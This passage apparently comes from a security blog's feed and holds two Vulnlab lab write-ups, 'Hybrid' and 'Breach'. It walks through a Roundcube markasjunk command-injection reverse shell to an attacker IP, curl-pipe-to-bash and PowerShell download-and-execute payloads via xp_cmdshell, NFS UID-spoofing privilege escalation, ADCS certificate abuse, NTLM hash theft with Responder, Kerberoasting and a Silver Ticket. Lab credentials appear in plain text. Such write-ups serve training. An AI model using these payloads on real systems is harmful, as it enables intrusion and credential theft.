PIPELINING USER TOP RESP-CODES SASL(PLAIN LOGIN) </span><br><span class="line">2049/tcp  open  nfs_acl  syn-ack ttl 63 3 (RPC #100227)</span><br><span class="line">37589/tcp open  status   syn-ack ttl 63 1 (RPC #100024)</span><br><span class="line">43503/tcp open  nlockmgr syn-ack ttl 63 1-4 (RPC #100021)</span><br><span class="line">43935/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br><span class="line">50923/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br><span class="line">58479/tcp open  mountd   syn-ack ttl 63 1-3 (RPC #100005)</span><br></pre></td></tr></table></figure><p>Machine: Ubuntu<br>Initial Observations:</p><ol><li>SMTP: Potential for username enumeration (two ports available)</li><li>HTTP: Possible exploit avenue</li><li>SSH: Potential credential discovery</li><li>Recommendation: Perform full port scan</li></ol><h2 id="SMTP-Exploration"><a href="#SMTP-Exploration" class="headerlink" title="SMTP Exploration"></a>SMTP Exploration</h2><p>Initially attempted to exploit a CVE for SMTP RCE, but was unsuccessful.</p><p><img src="/images/Hybrid/mail.png" alt="SMTP"></p><p>After directory searching, discovered:</p><ul><li>Port 80 runs Roundcube Webmail Release 1.6.1</li><li>No major known vulnerabilities initially apparent</li></ul><h3 id="Roundcube-Webmail-Analysis"><a href="#Roundcube-Webmail-Analysis" class="headerlink" title="Roundcube Webmail Analysis"></a>Roundcube Webmail Analysis</h3><p>Examined <code>composer.json</code> for version and dependency details.<br>References:</p><ul><li><a href="https://www.rapid7.com/db/vulnerabilities/debian-cve-2024-42009/">Rapid7 Vulnerability Database</a></li></ul><h2 id="NFS-Exploration"><a href="#NFS-Exploration" class="headerlink" title="NFS Exploration"></a>NFS Exploration</h2><p>Mount NFS Share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs -o vers=3 10.10.176.38:/opt/share /mnt/tmpmnt -o nolock</span><br></pre></td></tr></table></figure><p>Found <code>backup.tar.gz</code>, extracted contents:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvzf backup.tar.gz</span><br></pre></td></tr></table></figure><p>Extracted Files:</p><ul><li><code>/etc/passwd</code></li><li><code>/etc/sssd/sssd.conf</code></li><li><code>/etc/dovecot/dovecot-users</code></li><li><code>/etc/postfix/main.cf</code></li><li><code>/opt/certs/hybrid.vl/fullchain.pem</code></li><li><code>/opt/certs/hybrid.vl/privkey.pem</code></li></ul><h3 id="Credential-Discovery"><a href="#Credential-Discovery" class="headerlink" title="Credential Discovery"></a>Credential Discovery</h3><p>In <code>/mnt/etc/dovecot/dovecot-users</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@hybrid.vl:&#123;plain&#125;Duckling21</span><br><span class="line">peter.turner@hybrid.vl:&#123;plain&#125;PeterIstToll!</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/peter_email.png" alt="Peter&#39;s Email"></p><h2 id="Exploitation-Strategy"><a href="#Exploitation-Strategy" class="headerlink" title="Exploitation Strategy"></a>Exploitation Strategy</h2><p>Identified Vulnerability:</p><ul><li>Roundcube version 1.6.1 and prior (with markasjunk plugin enabled)</li><li><a href="https://ssd-disclosure.com/ssd-advisory-roundcube-markasjunk-rce/">SSD Advisory - Roundcube RCE</a></li></ul><p>Exploitation Techniques:</p><ol><li><p>Base64 Encoded Payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ==</span><br></pre></td></tr></table></figure></li><li><p>Url Encode it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ%3D%3D</span><br></pre></td></tr></table></figure></li><li><p>Put it all together and send it threw burp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin%26echo$&#123;IFS&#125;L2Jpbi9zaCAtaSA%2BJiAvZGV2L3RjcC8xMC44LjUuMTk1LzQ0NDQgMD4mMQ%3D%3D|base64$&#123;IFS&#125;-d|bash%26%40hybrid.vl</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/shell.png" alt="Shell Exploitation"></p></li><li><p>Alternate Payload Method:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peter.turner&amp;curl$&#123;IFS&#125;10.8.5.195/shell.sh$&#123;IFS&#125;|$&#123;IFS&#125;bash&amp;@hybrid.vl</span><br></pre></td></tr></table></figure></li></ol><p>After creating the identity we send a email the ourselves (using the identity we created) and we click the Junk button for the payload to trigger</p><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p>Database Credentials after running linpeas:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$config[&#x27;db_dsnw&#x27;] = &#x27;mysql://roundcube:Duckling21@localhost/roundcubemail&#x27;;</span><br></pre></td></tr></table></figure><p>MySQL Access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u roundcube -p roundcubemail</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/priv_esc.png" alt="Privilege Escalation"><br>We didnt find anything noteworthy on the database.</p><h4 id="Advanced-NFS-User-Context-Exploitation"><a href="#Advanced-NFS-User-Context-Exploitation" class="headerlink" title="Advanced NFS User Context Exploitation"></a>Advanced NFS User Context Exploitation</h4><p>This exploit leverages a sophisticated technique involving User ID (UID) manipulation and NFS (Network File System) permissions. By carefully crafting a series of steps, we can potentially gain access to a user’s context without direct credential compromise.</p><h5 id="Initial-User-Reconnaissance"><a href="#Initial-User-Reconnaissance" class="headerlink" title="Initial User Reconnaissance"></a>Initial User Reconnaissance</h5><p>When examining the target user’s identification details, we observe a critical piece of information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@mail01:~/roundcube$ id peter.turner@hybrid.vl</span><br><span class="line">id peter.turner@hybrid.vl</span><br><span class="line">uid=902601108(peter.turner@hybrid.vl) gid=902600513(domain users@hybrid.vl) groups=902600513(domain users@hybrid.vl),902601104(hybridusers@hybrid.vl)</span><br></pre></td></tr></table></figure><h5 id="Exploitation-Methodology"><a href="#Exploitation-Methodology" class="headerlink" title="Exploitation Methodology"></a>Exploitation Methodology</h5><p>The core of this technique revolves around creating a local user with an identical UID and manipulating the bash executable’s permissions through an NFS-mounted share.<br>The attack involves a nuanced approach of running <code>/bin/bash</code> in a context that mimics the target user, without directly compromising their actual credentials. By creating a user with the same UID and strategically modifying the bash binary, we can effectively execute commands in the target user’s context.</p><h5 id="Detailed-Exploitation-Steps"><a href="#Detailed-Exploitation-Steps" class="headerlink" title="Detailed Exploitation Steps"></a>Detailed Exploitation Steps</h5><p>Each step is carefully designed to recreate the target user’s environment and escalate privileges:</p><ul><li>Remote Host: <code>cp /bin/bash /opt/share/</code><ul><li>Copying the <code>/bin/bash</code> executable into the NFS share.</li></ul></li><li>Local Host: <code>sudo useradd peter.turner@hybrid.vl -u 902601108</code><ul><li>Creating a user named <code>peter.turner@hybrid.vl</code> with the same UID as the remote machine.</li><li>NOTE: We will need to edit <code>/etc/login.defs</code> and change <code>UID_MAX</code> to a value greater than <code>902601108</code>.</li></ul></li><li>Local Host: <code>sudo su -l peter.turner@hybrid.vl</code><ul><li>Logging into the new user we created.*</li></ul></li><li>Local Host: <code>sudo mount -t nfs -o vers=3 10.10.231.246:/opt/share /mnt/tmpmnt -o nolock</code><ul><li>Mounting the NFS share to <code>/mnt/tmpmnt</code> once more.</li></ul></li><li>Local Host: <code>cp /mnt/tmpmnt/bash /tmp/tmpbash/</code><ul><li>Copying the <code>bash</code> executable to a temporary directory just so we can reset the privileges of the binary&#x2F;</li></ul></li><li>Remote Host: <code>rm /opt/share/bash</code><ul><li>Removing the <code>bash</code> executable from the remote machine so that we can replace it with a newly configured bash executable.</li></ul></li><li>Local Host: <code>cp /tmp/tmpbash/bash /mnt/tmpmnt/</code><ul><li>Copying our executable back into the NFS share.</li></ul></li><li>Local Host: <code>chmod +s /mnt/tmpmnt/bash</code><ul><li>Configuring the sticky bit of the <code>bash</code> executable. By configuring this privilege, it is essentially saying that any user that runs this binary will run it as the context of that user.</li></ul></li><li>Remote Host: <code>/opt/share/bash -p</code><ul><li>We are running the <code>bash</code> binary with <code>-p</code>, which stands for <code>privileged mode</code>. This essentially means that it will set the effective user ID (EUID) to the real user ID. The binary will run with the permissions of the same user who invoked it based on the user ID. (In this case, <code>peter.turner@hybrid.vl</code>)<br><a href="https://github.com/InfoSecWarrior/Offensive-Pentesting-Enumeration/blob/main/NFS/README.md#escalate-the-privileges-by-nfs">https://github.com/InfoSecWarrior/Offensive-Pentesting-Enumeration/blob/main/NFS/README.md#escalate-the-privileges-by-nfs</a></li></ul></li></ul><h3 id="dc01-hybrid-vl"><a href="#dc01-hybrid-vl" class="headerlink" title="dc01.hybrid.vl"></a>dc01.hybrid.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-22 13:05:38Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">| rdp-ntlm-info: </span><br><span class="line">|   Target_Name: HYBRID</span><br><span class="line">|   NetBIOS_Domain_Name: HYBRID</span><br><span class="line">|   NetBIOS_Computer_Name: DC01</span><br><span class="line">|   DNS_Domain_Name: hybrid.vl</span><br><span class="line">|   DNS_Computer_Name: dc01.hybrid.vl</span><br><span class="line">|   Product_Version: 10.0.20348</span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50182/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">53771/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53784/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53791/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">53807/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">55984/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><h2 id="ADCS-Active-Directory-Certificate-Services-Exploitation"><a href="#ADCS-Active-Directory-Certificate-Services-Exploitation" class="headerlink" title="ADCS (Active Directory Certificate Services) Exploitation"></a>ADCS (Active Directory Certificate Services) Exploitation</h2><h3 id="Initial-Reconnaissance-1"><a href="#Initial-Reconnaissance-1" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u &#x27;peter.turner&#x27;@hybrid.vl -p &#x27;b0cwR+G4Dzl_rw&#x27; -dc-ip 10.10.210.149</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/esc1.png" alt="ESC1 Exploitation"></p><h3 id="Machine-Account-Exploitation"><a href="#Machine-Account-Exploitation" class="headerlink" title="Machine Account Exploitation"></a>Machine Account Exploitation</h3><p>Used KeyTabExtract to obtain NTLM hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 keytabextraction.py krb5.keytab</span><br></pre></td></tr></table></figure><p>Certificate Request:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;MAIL01$&#x27;@hybrid.vl -hashes &#x27;&lt;HASH&gt;&#x27; -ca &#x27;hybrid-DC01-CA&#x27; -template HybridComputers -dc-ip 10.10.210.149 -upn &#x27;administrator@hybrid.vl&#x27; -dns dc01.hybrid.vl -key-size 4096 -debug</span><br></pre></td></tr></table></figure><h3 id="Final-Domain-Admin-Acquisition"><a href="#Final-Domain-Admin-Acquisition" class="headerlink" title="Final Domain Admin Acquisition"></a>Final Domain Admin Acquisition</h3><p>Targeted <code>edward.miller</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u &#x27;MAIL01$&#x27;@hybrid.vl -hashes &#x27;&lt;HASH&gt;&#x27; -ca &#x27;hybrid-DC01-CA&#x27; -template HybridComputers -dc-ip 10.10.210.149 -upn &#x27;edward.miller@hybrid.vl&#x27; -key-size 5000 -debug</span><br></pre></td></tr></table></figure><p>WinRM Access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.210.149 -u edward.miller -H &#x27;&lt;HASH&gt;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Hybrid/gotdomain.png" alt="Domain Admin Access"></p><p><a href="https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86" title="https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86">https://api.vulnlab.com/api/v1/share?id=3699f13c-1071-42b6-a209-7417a77b9d86</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
            <tag> Chain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Breach</title>
      <link href="/2025/03/18/VL-Breach/"/>
      <url>/2025/03/18/VL-Breach/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Enumeration"><a href="#Initial-Enumeration" class="headerlink" title="Initial Enumeration"></a>Initial Enumeration</h2><h3 id="NMAP-Scan-Results"><a href="#NMAP-Scan-Results" class="headerlink" title="NMAP Scan Results"></a>NMAP Scan Results</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-17 15:22:18Z)</span><br><span class="line">135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp  open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   10.10.109.252:1433: </span><br><span class="line">|     Target_Name: BREACH</span><br><span class="line">|     NetBIOS_Domain_Name: BREACH</span><br><span class="line">|     NetBIOS_Computer_Name: BREACHDC</span><br><span class="line">|     DNS_Domain_Name: breach.vl</span><br><span class="line">|     DNS_Computer_Name: BREACHDC.breach.vl</span><br><span class="line">|     DNS_Tree_Name: breach.vl</span><br><span class="line">|_    Product_Version: 10.0.20348</span><br><span class="line">3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: breach.vl0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-03-17T15:22:26</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: mean: -1h59m59s, deviation: 0s, median: -1h59m59s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled and required</span><br></pre></td></tr></table></figure><h2 id="User-Access"><a href="#User-Access" class="headerlink" title="User Access"></a>User Access</h2><h3 id="Enumerating-Shares"><a href="#Enumerating-Shares" class="headerlink" title="Enumerating Shares"></a>Enumerating Shares</h3><p>First, let’s check for available SMB shares using the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb 10.10.109.252 -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/shares.png" alt="Available SMB Shares"><br>Next, let’s connect to the “share” using the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.109.252/share -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/pot-users.png" alt="Potential Users"><br>We found several potential users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">claire.pope</span><br><span class="line">diana.pope</span><br><span class="line">julia.wong</span><br></pre></td></tr></table></figure><h3 id="NTLM-Hash-Capture"><a href="#NTLM-Hash-Capture" class="headerlink" title="NTLM Hash Capture"></a>NTLM Hash Capture</h3><p>We used <code>ntlm_theft</code> (<a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a>) to create files that, when accessed, would send us the NTLM hash of the user who opened them:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py -g all -s &lt;your ip&gt; -f invoice</span><br></pre></td></tr></table></figure><p>After creating these files, we connected to the SMB share and uploaded them to all accessible folders:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.126.89/share -U &#x27;guest&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mput *</span><br></pre></td></tr></table></figure><p>Then we started Responder to capture any callbacks:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/julia-wong.png" alt="Julia Wong Hash Capture"><br>We saved the hash and cracked it using hashcat:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash55.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><h3 id="Accessing-Julia-Wong’s-Files"><a href="#Accessing-Julia-Wong’s-Files" class="headerlink" title="Accessing Julia Wong’s Files"></a>Accessing Julia Wong’s Files</h3><p>Now that we have Julia Wong’s credentials, we logged back into the share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.126.89/share -U &#x27;julia.wong&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/localfile.png" alt="Local User Flag"><br>This is where we found the user flag.</p><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="BloodHound-Enumeration"><a href="#BloodHound-Enumeration" class="headerlink" title="BloodHound Enumeration"></a>BloodHound Enumeration</h3><p>To get a better understanding of the Active Directory environment, we used BloodHound:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.126.89 -u &#x27;julia.wong&#x27; -p &#x27;Computer1&#x27;  --bloodhound --dns-server 10.10.126.89 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>Inside BloodHound, we identified a kerberoastable service named <code>SVC_MSSQL@BREACH.VL</code>. We decided to target this service for our lateral movement.</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>We attempted to obtain the service hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-GetUserSPNs -dc-ip 10.10.126.89 -request breach.vl/julia.wong:&#x27;&lt;PASSWORD&gt;&#x27;</span><br></pre></td></tr></table></figure><p>Initially, we encountered a clock skew error: <code>KRB_AP_ERR_SKEW(Clock skew too great)</code>. To fix this, we synchronized our time with the target system:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo timedatectl set-ntp off</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo rdate -n [IP of Target]</span><br></pre></td></tr></table></figure><p>Then we ran GetUserSPNs again:<br><img src="/images/Breach/sql-serv-hash.png" alt="SQL Service Hash"><br>We cracked the hash using hashcat:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash56.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>This gave us the password for the MSSQL service account.</p><h3 id="MSSQL-Access"><a href="#MSSQL-Access" class="headerlink" title="MSSQL Access"></a>MSSQL Access</h3><p>We connected to the MSSQL server using the service account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient svc_mssql:Trustno1@10.10.126.89</span><br></pre></td></tr></table></figure><p>We attempted to enable command execution but encountered permission issues:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 105: User does not have permission to perform this action.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 62: The configuration option &#x27;xp_cmdshell&#x27; does not exist, or it may be an advanced option.</span><br><span class="line">ERROR(BREACHDC\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.</span><br></pre></td></tr></table></figure><h3 id="Silver-Ticket-Attack"><a href="#Silver-Ticket-Attack" class="headerlink" title="Silver Ticket Attack"></a>Silver Ticket Attack</h3><p>Since we couldn’t execute commands directly, we decided to create a Silver Ticket:</p><ol><li><p>First, we converted the service account password to an NT hash using an online tool: <a href="https://www.browserling.com/tools/ntlm-hash">https://www.browserling.com/tools/ntlm-hash</a></p></li><li><p>Next, we needed the domain SID:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lookupsid.py &#x27;breach.vl/svc_mssql@10.10.126.89&#x27; 0</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Domain SID is: S-1-5-21-2330692793-3312915120-706255856</span><br></pre></td></tr></table></figure></li><li><p>We created the Silver Ticket using ticketer:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ticketer -nthash &lt;&gt; -domain-sid S-1-5-21-2330692793-3312915120-706255856 -domain breach.vl -dc-ip breachdc -spn MSSQLSvc/breachdc.breach.vl:1433 administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure></li><li><p>We used the Silver Ticket to connect to MSSQL as administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-mssqlclient -k breachdc.breach.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enable_xp_cmdshell</span><br></pre></td></tr></table></figure></li></ol><h3 id="Getting-a-Reverse-Shell"><a href="#Getting-a-Reverse-Shell" class="headerlink" title="Getting a Reverse Shell"></a>Getting a Reverse Shell</h3><p>Our initial attempt to get a reverse shell was flagged as malicious:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;powershell -ep bypass -nop -w hidden -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://10.8.5.195:8080/Invoke-ConPtyShell.ps1&#x27;&#x27;); Invoke-ConPtyShell 10.8.5.195 3001&quot;&#x27;;</span><br></pre></td></tr></table></figure><p>We found an alternative payload that worked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC xp_cmdshell &#x27;powershell -ep bypass -nop -w hidden -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#x27;&#x27;http://10.8.5.195:8080/maybe.ps1&#x27;&#x27;)&quot;&#x27;;</span><br></pre></td></tr></table></figure><p><img src="/images/Breach/shell.png" alt="Initial Shell"></p><h2 id="Privilege-Escalation-to-SYSTEM"><a href="#Privilege-Escalation-to-SYSTEM" class="headerlink" title="Privilege Escalation to SYSTEM"></a>Privilege Escalation to SYSTEM</h2><p><img src="/images/Breach/impersonate.png" alt="Impersonation Privileges"><br>Since we had impersonation privileges, we used GodPotato to escalate to SYSTEM: <a href="https://github.com/BeichenDream/GodPotato/releases/tag/V1.20">https://github.com/BeichenDream/GodPotato/releases/tag/V1.20</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./God.exe -cmd &quot;C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -NoProfile -Command  IEX (New-Object 